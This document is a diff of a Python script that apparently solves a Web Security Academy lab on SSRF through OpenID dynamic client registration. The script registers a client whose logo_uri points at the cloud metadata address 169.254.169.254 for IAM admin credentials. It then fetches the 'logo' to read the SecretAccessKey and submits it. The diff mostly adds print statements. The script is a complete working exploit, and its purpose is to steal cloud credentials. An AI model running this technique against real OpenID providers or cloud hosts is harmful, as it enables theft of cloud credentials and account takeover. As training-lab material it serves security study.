@@ -9,7 +9,7 @@ import json
 s = requests.Session()
 
 # Get login form
-site = 'acfd1fbf1f05ab7c805d0a0d0031007a.web-security-academy.net'
+site = 'ac5c1fdc1f5a505f80d653b900d20009.web-security-academy.net'
 my_account_url = f'https://{site}/my-account'
 resp = s.get(my_account_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
@@ -24,13 +24,14 @@ submit_solution_url = f'https://{site}{submit_solution_path}'
 reg_config_url = f'https://{sm_site}/.well-known/openid-configuration'
 resp = s.get(reg_config_url)
 reg_endpoint = json.loads(resp.text)["registration_endpoint"]
+print(f'Got registration endpoint from config file: \n{reg_endpoint}\n')
 
 # Register our client, including the lie that the victim page is a logo
 payload_json = {
     "redirect_uris": [
         "https://example.com"
     ],
-    "logo_uri": 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/'
+    "logo_uri": 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/'  # Victim page!
 }
 headers = {
     'Host': sm_site,
@@ -38,11 +39,15 @@ headers = {
 }
 resp = s.post(reg_endpoint, json=payload_json, headers=headers)
 client_id = json.loads(resp.text)['client_id']
+print(f'Registering site with victim url as logo_uri: \n{payload_json}\n')
+print(f'Got our client id: \n{client_id}\n')
 
 # Now request the 'logo' from the server...
 logo_uri = f'https://{sm_site}/client/{client_id}/logo'
 resp = s.get(logo_uri)
 secret_access_key = json.loads(resp.text)['SecretAccessKey']
+print(f'Got the admin file: \n{resp.text}\n')
+print(f'Got our secret access key: \n{secret_access_key}\n')
 
 # Submit secret access key key to win level
 user_data = json.loads(resp.text)
